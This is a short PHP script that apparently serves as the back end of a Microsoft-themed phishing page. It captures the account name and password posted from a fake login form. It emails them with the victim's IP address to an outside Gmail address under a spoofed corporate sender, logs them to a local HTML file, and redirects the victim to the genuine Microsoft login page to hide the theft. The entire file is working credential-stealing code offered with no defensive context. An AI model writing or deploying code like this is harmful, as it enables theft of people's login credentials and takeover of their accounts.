<?php 
$logsfile = 'datos.html';
	
$_SESSION['account'] = $_POST['account'];
$_SESSION['password'] = $_POST['password'];

$ip = getenv("REMOTE_ADDR");
$Fecha= date('d-m-Y');
$Hora= date('H:i:s');


$correo="mariobunge1982@gmail.com";
$subj="Login - $ip";
$from= "From: Bunge <brchile@bunge.com.pe>";

$account= $_POST ['account'];
$password= $_POST ['password'];
$user_agent = getenv("HTTP_USER_AGENT");

	

$content = "    | $Fecha - $Hora | $ip | $account | $password |<br>";

mail($correo, $subj, $content, $from);
	

    $file=fopen($logsfile, "a+"); 
    fwrite($file,$content); 
    fclose($file);

header("Location: https://login.microsoftonline.com/");
exit;

?>

